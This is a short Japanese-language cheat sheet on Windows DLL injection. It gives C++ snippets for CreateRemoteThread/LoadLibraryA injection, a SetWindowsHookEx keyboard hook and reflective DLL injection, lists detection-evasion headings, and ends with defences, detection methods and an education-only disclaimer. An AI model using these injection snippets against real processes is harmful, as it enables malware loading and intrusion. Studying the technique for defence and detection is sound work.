# DLL Injection Techniques

**対応OS**: Windows

## 概要
DLLインジェクションは、実行中のプロセスに悪意のあるDLLを強制的に読み込ませる手法です。

## 基本的な手法

### CreateRemoteThread
```cpp
// ターゲットプロセスを開く
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

// DLLパスのメモリ確保
LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// DLLパスの書き込み
WriteProcessMemory(hProcess, pDllPath, dllPath,
    strlen(dllPath) + 1, NULL);

// LoadLibraryAのアドレス取得
LPVOID pLoadLibrary = GetProcAddress(
    GetModuleHandle("kernel32.dll"), "LoadLibraryA");

// リモートスレッド作成
CreateRemoteThread(hProcess, NULL, 0,
    (LPTHREAD_START_ROUTINE)pLoadLibrary,
    pDllPath, 0, NULL);
```

### SetWindowsHookEx
```cpp
// フックプロシージャ
LRESULT CALLBACK HookProc(int code, WPARAM wParam, LPARAM lParam)
{
    return CallNextHookEx(NULL, code, wParam, lParam);
}

// フックの設定
HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD,
    HookProc, hInstance, threadId);
```

## 検知回避テクニック
- APIフック回避
- メモリスキャン回避
- 実行フロー制御
- タイミング制御

## 高度な手法

### リフレクティブDLLインジェクション
```cpp
typedef HMODULE (*LoadDllFunc)(LPVOID);

// DLLのローダーコードをメモリに書き込み
WriteProcessMemory(hProcess, pRemoteBuffer,
    lpBuffer, dwLength, NULL);

// ローダーコードを実行
CreateRemoteThread(hProcess, NULL, 0,
    (LPTHREAD_START_ROUTINE)pRemoteBuffer,
    NULL, 0, NULL);
```

## 防御策
- DLL読み込みの監視
- プロセスメモリの保護
- APIフックの検知
- ホワイトリスト化

## 検知方法
- 不審なDLL読み込み
- リモートスレッド作成
- メモリ領域の変更
- APIコールの監視

## 注意事項
- このテクニックは教育目的でのみ使用してください
- 実環境での使用は法的責任を伴う可能性があります
- すべてのテストは許可された環境でのみ行ってください 